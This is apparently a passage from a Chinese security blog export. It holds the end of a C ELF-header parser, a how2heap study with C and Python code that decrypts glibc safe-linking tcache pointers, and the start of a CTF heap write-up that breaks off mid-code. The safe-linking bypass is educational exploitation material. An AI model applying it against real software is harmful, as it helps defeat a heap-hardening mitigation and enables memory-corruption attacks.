class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elf32_Ehdr elf_header;</span><br><span class="line">    rewind(fp);</span><br><span class="line">    fread(&amp;elf_header,<span class="keyword">sizeof</span>(Elf32_Ehdr),<span class="number">1</span>,fp);</span><br><span class="line"></span><br><span class="line">    e_type_check(elf_header.e_type);</span><br><span class="line">    <span class="keyword">if</span>(elf_header.e_machine==<span class="number">62</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: EM_X86_64\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: %hx\n"</span>,elf_header.e_machine);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行版本:%hx\n"</span>,elf_header.e_version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"入口虚拟RVA: 0x%x\n"</span>,elf_header.e_entry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头文件偏移: 0x%x(bytes)\n"</span>,elf_header.e_phoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"节头表文件偏移: 0x%x(bytes)\n"</span>,elf_header.e_shoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF文件头大小: 0x%x\n"</span>,elf_header.e_ehsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头大小: 0x%x\n"</span>,elf_header.e_phentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头表数量: 0x%x\n"</span>,elf_header.e_phnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表大小: 0x%x\n"</span>,elf_header.e_shentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表数量: 0x%x\n"</span>,elf_header.e_shnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"字符串表索引节头: 0x%x\n"</span>,elf_header.e_shstrndx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">char</span> *typecheck;</span><br><span class="line">    <span class="keyword">if</span>  (argc&lt;<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]not find test ELF file !\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp=fopen((<span class="keyword">char</span>*)argv[<span class="number">1</span>],<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]don't open file\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    typecheck=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    fread(typecheck,<span class="number">0x10</span>,<span class="number">1</span>,fp);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(typecheck[<span class="number">1</span>]!=<span class="string">'E'</span>&amp;&amp;typecheck[<span class="number">2</span>]!=<span class="string">'L'</span>&amp;&amp;typecheck[<span class="number">3</span>]!=<span class="string">'L'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]don't is ELF file!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    e_ident_read(typecheck);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(typecheck[<span class="number">4</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x64_header_read(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(typecheck[<span class="number">4</span>]==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x32_header_read(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[x]get some wrong!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ch3nye.top/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0(ELF)/" target="_blank" rel="noopener">https://ch3nye.top/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0(ELF)/</a></p><p><a href="https://copyright1999.github.io/2021/10/10/%E8%A7%A3%E6%9E%90ELF%E6%96%87%E4%BB%B6-%E4%B8%80/" target="_blank" rel="noopener">https://copyright1999.github.io/2021/10/10/%E8%A7%A3%E6%9E%90ELF%E6%96%87%E4%BB%B6-%E4%B8%80/</a></p><p><a href="https://segmentfault.com/a/1190000016766079" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016766079</a></p>]]></content>
      
      
      <categories>
          
          <category> ELF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap-decrypt_safe_linking学习</title>
      <link href="/2022/10/16/decrypt_safe_linking/"/>
      <url>/2022/10/16/decrypt_safe_linking/</url>
      
        <content type="html"><![CDATA[<p>在2.32glibc中，新增的防护之指针异或加密机制到 fastbin 和 tcache 当中，将 pos &gt;&gt; 12 后的值 key，与原来的 next 进行异或，作为新的 next 值。<a id="more"></a></p><h2 id="新机制说明"><a href="#新机制说明" class="headerlink" title="新机制说明"></a>新机制说明</h2><p><img src="image-20221016145439852.png" alt="image-20221016145439852"></p><p>以free函数为例子，在2.32glibc中在释放chunk时 不是直接把 fd 值放入 <code>p-&gt;fd</code>中。而是经过 <code>PROTECT_PTR</code>或 <code>REVEAL_PTR</code>处理。 <code>PROTECT_PTR</code>和 <code>REVEAL_PTR</code>在宏定义中定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the "next" pointers of the</span></span><br><span class="line"><span class="comment">   lists' chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p><code>PROTECT_PTR</code>和 <code>REVEAL_PTR</code> 使用ASLR（mmap_base）的随机性来保护单链接列表Fast Bins和TCache。也就是说，屏蔽列出块，并对其执行分配对齐检查。这种机制降低了指针劫持的风险，就像对在小箱子的双重链接列表中安全断开链接。它假定最小页面大小为4096字节（12位）。具有的系统较大的页面提供较少的熵，尽管指针会被破坏仍然有效.用一个官方例子来描述:</p><p><img src="libc_figure_6.png" alt="libc_figure_6"></p><p>即 <strong>tcache_entry-&gt;next中存放的chunk地址为与自身地址进行异或运算后所得到的值</strong>， 这就要求我们在利用 tcache_entry 进行任意地址写之前 <strong>需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写</strong>，这给传统的利用方式无疑是增加了不少的难度.</p><h2 id="how2heap-decrypt-safe-linking手法分析"><a href="#how2heap-decrypt-safe-linking手法分析" class="headerlink" title="how2heap-decrypt_safe_linking手法分析"></a>how2heap-decrypt_safe_linking手法分析</h2><p>在how2heap提供了一个<code>decrypt_safe_linking.c</code>的例子让我们在新机制下获得 fastbin 和 tcache的真实fd。</p><p>但是我觉得例子不过深刻于是魔改了下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"because of the 12bit sliding."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)"</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"round %d:\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"key:    %#016lx\n"</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain:  %#016lx\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cipher: %#016lx\n\n"</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment"> * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment"> * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment"> * and the key (ASLR slide) is the same to the pointer's leading bits.</span></span><br><span class="line"><span class="comment"> * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment"> * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment"> * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment"> * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment"> * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment"> * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *c = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"First, we create chunk a @ %p and chunk b @ %p\n"</span>, a, b);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And then create a padding chunk to prevent consolidation."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2: free chunks</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now free chunk a and then free chunk b."</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now the freelist is: [%p -&gt; %p]\n"</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Due to safe-linking, the value actually stored at b[0] is: %#lx\n"</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3: recover the values</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Now decrypt the poisoned value"</span>);</span><br><span class="line"><span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"value: %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"recovered value: %#lx\n"</span>, plaintext);</span><br><span class="line">assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h3><p>1.我们先创建4个chunk和一个隔离chunk，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *c = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p><img src="16658363725510.png" alt="img"></p><p>2。然后我们释放一个chunk a。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(a);</span><br></pre></td></tr></table></figure><p><img src="image-20221015202118323.png" alt="image-20221015202118323"></p><p>可以看 加入了tcachebins 且fd 处存放的不是0，而是  0x555555559 （右移12位）</p><p>3.继续依次 c  d b 释放后 chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p><img src="image-20221015202508995.png" alt="image-20221015202508995"></p><p>ps：可以看 b c d 的fd ，与0x555555559 后，就是真正的fd的</p><p><img src="1665836803212.png" alt="img"></p><p>3.对d chunk的fd 进行 decrypt 函数解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"because of the 12bit sliding."</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)"</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"round %d:\n"</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"key:    %#016lx\n"</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain:  %#016lx\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"cipher: %#016lx\n\n"</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到6就循环后，d chunk的fd 的真实fd就还原过来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">round 1:</span><br><span class="line">key:    0000000000000000</span><br><span class="line">plain:  0000000000000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 2:</span><br><span class="line">key:    0x00000550000000</span><br><span class="line">plain:  0x00550000000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 3:</span><br><span class="line">key:    0x00000555550000</span><br><span class="line">plain:  0x00555550000000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 4:</span><br><span class="line">key:    0x00000555555550</span><br><span class="line">plain:  0x00555555550000</span><br><span class="line">cipher: 0x0055500000cd89</span><br><span class="line"></span><br><span class="line">round 5:</span><br><span class="line">key:    0x00000555555559</span><br><span class="line">plain:  0x005555555598d0</span><br><span class="line">cipher: 0x0055500000cd89</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>从上面的例子可以看出，fd 位置存放值就是 原本fd的值（前一个tache的真实地址）右移 12位与fd 位置的地址值。但由于我们只 12位原本fd的值，因此我们还有3个地址位是原本的。又异或可逆性，我们可以将没变的3个地址位或2个地址右移 12位与上fd 位置存放值，还原出原本 fd一部分值 高4-6位。在把原本 fd一部分与旧原本 fd一部分再右移 12位与上fd 位置存放值，又可以得到一部分原本fd值。<img src="image-20221016213012185.png" alt="image-20221016213012185">因此我们可以更具异或可逆性，慢慢还原出来。</p><p>python版脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0055500000cd89</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    plain=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        bits= <span class="number">64</span><span class="number">-12</span>*(i+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span>(bits&lt;<span class="number">0</span>):</span><br><span class="line">            bits=<span class="number">0</span></span><br><span class="line">        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits</span><br><span class="line">        key = plain &gt;&gt; <span class="number">12</span></span><br><span class="line">        print(<span class="string">"round %d:\n"</span>%(i))</span><br><span class="line">        print(<span class="string">"key:    %#016lx\n"</span>%key)</span><br><span class="line">        print(<span class="string">"plain:  %#016lx\n"</span>%plain)</span><br><span class="line">        print(<span class="string">"cipher: %#016lx\n\n"</span>%cipher)</span><br><span class="line"></span><br><span class="line">decrypt(<span class="number">0x0055500000cd89</span>)</span><br></pre></td></tr></table></figure><h2 id="后记思考"><a href="#后记思考" class="headerlink" title="后记思考"></a>后记思考</h2><p>其实若是第一个tache 那么放入fd 的值就是 (fd^0)&gt;&gt;12.</p><p>同时，7个 连续小于等于0x240的tache或fast bin 的间地址差不会超过0x1000.</p><p>因此泄露出第一个tache的fd里的值为keys，直接与其他tache的fd相与。就可以得到原址。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>在uclibc-ng中引入的补丁：<a href="https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c" target="_blank" rel="noopener">https://gogs.waldemar-brodkorb.de/oss/uclibc-ng/commit/886878b22424d6f95bcdeee55ada72049d21547c</a>  就是在取p-&gt;fd和存放p-&gt;fd时都改成调用REVEAL_PTR</p><p><a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/" target="_blank" rel="noopener">https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/</a>  机制介绍</p><p><a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation" target="_blank" rel="noopener">https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation</a> 机制绕过</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022川渝职业技能竞赛初赛--hard_login</title>
      <link href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/"/>
      <url>/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/</url>
      
        <content type="html"><![CDATA[<p>太久没有做堆题了，突然做一道感觉还挺有意思的(主要全都忘完了/(ㄒoㄒ)/~~)<a id="more"></a></p><h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><p>UAF</p><p>unsorted bin（glibc 2.31）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目是经典的堆题，给了2.31的libc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>分析代码，分析提供四个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v7 = v3;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        show_info((__int64)&amp;v7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        find_password();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span 